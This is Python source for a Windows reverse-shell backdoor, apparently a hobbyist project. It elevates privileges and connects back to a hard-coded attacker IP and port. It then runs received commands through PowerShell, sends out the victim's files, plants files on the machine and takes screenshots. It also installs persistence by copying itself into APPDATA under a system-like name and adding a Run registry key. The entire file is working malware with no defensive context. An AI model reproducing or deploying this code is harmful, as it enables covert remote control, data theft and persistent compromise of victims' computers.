import socket
import subprocess
import time
import os
import pyautogui
import PIL
import shutil
import winreg
import sys

from elevate import elevate
elevate()


IDENTIFIER = "<END_OF_COMMAND_RESULT>"
eof_identifier = "<END_OF_FILE_IDENTIFIER>"
CHUNK_SIZE = 2048


if __name__ == "__main__":
    

    hacker_IP = "192.168.1.197" #private
    #hacker_IP = "public address" #public
    hacker_port = 8008
    hacker_address = (hacker_IP, hacker_port)
    
    while True:
        try:
            
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
            print("trying to connect with ", hacker_address)
            victim_socket.connect(hacker_address)
            while True:    
                data = victim_socket.recv(1024)

                hacker_command = data.decode()
                print("hacker command = ", hacker_command)
                if hacker_command == "stop":
                    break
                elif hacker_command == "":
                    continue
                elif hacker_command.startswith("cd"):
                    path2move = hacker_command.strip("cd ")
                    if os.path.exists(path2move):
                        os.chdir(path2move)
                    else:
                        print("cant change dir to ", path2move)
                    continue
                elif hacker_command.startswith("download"):
                    file_to_download = hacker_command.strip("download ")
                    time.sleep(1)
                    if os.path.exists(file_to_download):

                        with open(file_to_download, "rb") as file:
                            chunk = file.read(CHUNK_SIZE)

                            while len(chunk) > 0:
                                victim_socket.send(chunk)
                                chunk = file.read(CHUNK_SIZE)
                            victim_socket.send(eof_identifier.encode())
                        print("File sent successfully")
                
                    else:
                        exists = "no"
                        print("File doesn't exist")
                        victim_socket.send(exists.encode())
                        continue     
                elif hacker_command.startswith("upload"):
                    file_name = hacker_command.strip("upload ")
                    skip_length = len(hacker_command)

                    with open(file_name, "wb") as file:
                        print("Downloading file")
                        while True:
                            chunk = victim_socket.recv(CHUNK_SIZE)
                            if chunk.endswith(eof_identifier.encode()):
                                chunk = chunk[skip_length:-len(eof_identifier)]
                                file.write(chunk)
                                break
                            file.write(chunk)
                    print("Successfully downloaded, ", file_name)
                
                elif hacker_command == "screenshot":
                    print("Taking screenshot")
                    screenshot = pyautogui.screenshot()
                    screenshot.save("screenshot.png")
                    print("screenshot saved")
                
                elif hacker_command == "persistance":
                    curr_executable = sys.executable
                    time.sleep(5)
                    app_data = os.getenv("APPDATA")
                    to_save_file = app_data +"\\"+"system32_data.exe"
                    time.sleep(5)

                    if not os.path.exists(to_save_file):
                        #print("Becoming Persistent")
                        shutil.copyfile(curr_executable, to_save_file)

                        key = winreg.HKEY_CURRENT_USER

                        # "Software\Microsoft\Windows\CurrentVersion\Run"

                        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

                        key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)

                        winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)

                        winreg.CloseKey(key_obj)

                        victim_socket.send("Persistance success!\n".encode())
                    else:
                        path_not_exist = "Path does not exist"
                        victim_socket.send(path_not_exist.encode())

                else:
                    output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True, stdin=subprocess.DEVNULL)
                    if output.stderr.decode("utf-8") == "":
                        command_result = output.stdout
                        command_result = command_result.decode("utf-8") + IDENTIFIER
                        command_result = command_result.encode("utf-8")
                    else:
                        command_result = output.stderr
                    
                    victim_socket.sendall(command_result)
        except KeyboardInterrupt:
            print("exiting")
        except Exception as err:
            print("Unable to connect: ", err)
            break
            time.sleep(5)
        